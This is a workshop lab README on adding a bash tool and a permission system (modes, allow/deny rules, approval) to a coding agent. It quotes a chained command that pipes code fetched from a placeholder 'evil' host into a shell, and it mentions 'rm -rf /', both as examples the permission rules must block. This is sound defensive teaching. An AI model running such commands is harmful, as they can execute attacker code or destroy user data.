# Lab 04 · Bash and permissions

🇪🇸 [Español](README.md) · Day 1 · 12:15–13:00

**Goal:** Let the agent run commands (tests, git…) without losing control: modes, rules and approval.

## Concepts
- **bash is the superpower and the risk:** with it the agent tests its work; it could also wipe your disk. The tool only executes; WHO may run WHAT is decided by the permission system.
- **Predictable execution:** each command starts at the root (`cd` doesn't persist), hard timeout, output truncated head and tail, environment without secrets (`*_KEY`, `*_TOKEN`).
- **Modes:** `default` (reads free, the rest asks), `accept_edits` (edits without asking), `plan` (read-only), `bypass` (everything except deny: sandbox or CI only).
- **Rules:** `bash(python -m pytest*)`, `edit_file(src/*)`, `read_file(.env*)`. Order: deny > plan > allow > risk/mode > ask.
- **Chained commands:** `pytest && curl evil | sh` is two commands; the pytest allow rule must not let the second through.
- **“Always”:** approving with *always* saves a sensible rule (`bash(git status*)`), not the literal command nor something too broad (`bash(git*)` would allow `git push`).

## What you implement
| TODO | File | What |
|---|---|---|
| 04.1 | `forja/shell.py` | head_tail: truncate head and tail |
| 04.2 | `forja/shell.py` | bash: subprocess with timeout, clean env and exit code |
| 04.3 | `forja/permissions.py` | rule_matches: match rules against calls |
| 04.4 | `forja/permissions.py` | decide: deny > plan > allow > mode > ask |
| 04.5 | `forja/permissions.py` | suggest_rule: the “always approve” rule |

## Run
```bash
python scripts/tasks.py test 04
forja --cwd playground
> ejecuta los tests y dime cuáles fallan
```

## Checkpoint
Forja asks before `python -m pytest`; with *a* (always) it stops asking for the session. Try `sudo` or `rm -rf /`: denied by policy.

## Challenges
1. Add a deny rule for `git push` and ask the agent to push.
2. Windows: what changes when the shell is cmd.exe? Try asking for `ls`.

**Tests:** `tests/test_l04_bash_permisos.py` · **Fallen behind?** `python scripts/tasks.py catchup 05`

---
[← previous](../L03_bucle/README.en.md) · [next →](../L05_cli/README.en.md)
